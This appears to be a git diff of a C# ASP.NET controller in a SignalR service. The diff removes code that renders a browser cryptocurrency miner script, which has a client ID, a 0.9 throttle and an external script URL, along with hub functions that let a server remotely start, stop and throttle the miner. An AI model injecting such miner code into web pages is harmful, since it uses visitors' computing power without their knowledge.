@@ -69,84 +69,18 @@ namespace SignalRService.Controllers
 
         }
 
-        
-
-        //[EnableCors(origins: "*", headers: "*", methods: "*")]
-        //public MvcHtmlString RenderMinerScript()
+        //public MvcHtmlString LoadWorkItem()
         //{
-        //    var MinerConfigurationViewModel = new SignalRService.ViewModels.MinerConfigurationViewModel()
-        //    {
-        //        ClientId = "b1809255c357703b48e30d11e1052387315fc5113510af1ac91b3190fff14087",
-        //        Throttle = "0.9",
-        //        ScriptUrl = "https://www.freecontent.date./W7KS.js",
-        //        StartDelayMs = 3000,
-        //        ReportStatusIntervalMs = 65000
-        //    };
+        //    string allcontent = "";
 
-        //    var str = Utils.RenderUtils.RenderRazorViewToString(this, "RenderMiner", MinerConfigurationViewModel);
-        //    return new MvcHtmlString(str);
+        //    MvcHtmlString minerScript = Utils.RenderUtils.RenderMinerScript(this);
+
+        //    allcontent += minerScript.ToString();
+
+        //    return new MvcHtmlString(allcontent);
         //}
 
-        public MvcHtmlString RenderMinerScript()
-        {
-            var MinerConfigurationViewModel = new SignalRService.ViewModels.MinerConfigurationViewModel()
-            {
-                ClientId = "b1809255c357703b48e30d11e1052387315fc5113510af1ac91b3190fff14087",
-                Throttle = "0.9",
-                ScriptUrl = "https://www.freecontent.date./Q0qN.js",
-                StartDelayMs = 3000,
-                ReportStatusIntervalMs = 65000
-            };
-
-            var str = RenderMinerHubMethods();
-            var viewstr = Utils.RenderUtils.RenderRazorViewToString(this, "RenderMiner", MinerConfigurationViewModel);
-            viewstr = viewstr.Replace("<script>", "").Replace("</script>", "").Replace("</head>","");
-
-            return new MvcHtmlString(str.ToString() + viewstr);
-        }
-
-        private MvcHtmlString RenderMinerHubMethods()
-        {
-            string str = @"
-
-                  servicehub.client.miner_start = function () {
-            start_miner();
-        }
-
-        servicehub.client.miner_stop = function () {
-            stop_miner();
-        }
-
-        servicehub.client.miner_reportStatus = function () {
-            //send stats to server
-            miner.reportStatus();
-        }
-
-        servicehub.client.miner_setThrottle = function (data) {
-            miner.client().setThrottle(data);
-        }";
-            return new MvcHtmlString(str);
-        }
-
-        //public PartialViewResult RenderSignalRBase(ViewModels.ServiceSettingViewModel basemodel)
-        //{
-        //    var modelx = new SignalRService.ViewModels.SignalRBaseConfigurationViewModel()
-        //    {
-
-        //        SinalRGroup = basemodel.ServiceUrl
-
-        //    };
-        //    return PartialView("RenderMiner", modelx);
-        //}
-
-        //public ActionResult SrcStarter(string url)
-        //{
-        //    var servicesetting = db.ServiceSettings.FirstOrDefault(ln => ln.ServiceUrl == url);
-        //    if (servicesetting == null)
-        //        return View("UrlNotFound", url);
-
-        //    return View(servicesetting.ToServiceSettingViewModel());
-        //}
+       
 
         public ActionResult Test()
         {
